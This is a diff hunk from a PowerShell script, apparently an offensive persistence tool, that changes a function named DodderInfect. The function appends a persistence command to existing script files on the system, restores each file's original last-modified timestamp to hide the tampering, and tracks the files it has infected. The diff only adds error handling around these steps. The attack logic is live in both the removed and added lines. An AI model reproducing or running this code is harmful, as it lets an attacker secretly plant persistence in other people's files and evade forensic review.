@@ -72,11 +72,16 @@ function DodderInfect {
     )
     $Script2Infect = $Global:Candidates[$ID]
     $SpawnPersistCommand = $fileExtensions[$Script2Infect.Extension].replace("COMMAND", $PersistCommand)
-    Add-Content -Path $Script2Infect.FilePath -Value ""
-    Add-Content -Path $Script2Infect.FilePath -Value $SpawnPersistCommand
-    Get-ChildItem -Path $Script2Infect.FilePath | ForEach-Object { $_.LastWriteTime = $Script2Infect.LastModified }
-    $Global:Infected[$ID] = $Script2Infect
-    $Global:Infected[$ID].Size = (Get-ChildItem -Path $Script2Infect.FilePath | Select-Object -ExpandProperty Length)
-    $Global:Candidates.Remove($ID)  
+    try {
+        Add-Content -Path $Script2Infect.FilePath -Value ""
+        Add-Content -Path $Script2Infect.FilePath -Value $SpawnPersistCommand
+        Get-ChildItem -Path $Script2Infect.FilePath | ForEach-Object { $_.LastWriteTime = $Script2Infect.LastModified }
+        $Global:Infected[$ID] = $Script2Infect
+        $Global:Infected[$ID].Size = (Get-ChildItem -Path $Script2Infect.FilePath | Select-Object -ExpandProperty Length)
+        $Global:Candidates.Remove($ID)  
+    }
+    catch {
+        Write-host $_
+    }
 }
 
